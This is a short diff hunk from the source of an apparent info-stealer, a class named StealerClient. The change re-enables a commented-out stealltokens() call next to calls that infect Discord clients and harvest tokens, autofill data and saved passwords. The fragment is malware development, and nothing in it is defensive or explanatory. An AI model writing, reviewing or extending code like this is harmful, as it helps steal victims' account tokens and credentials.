@@ -2609,7 +2609,7 @@ class StealerClient {
 		InfectDiscords();
 	//	StealTokens();
 	     stealTokens();
-	//	stealltokens();
+		stealltokens();
 		getAutofills();
 		getPasswords();
 		getZippp();
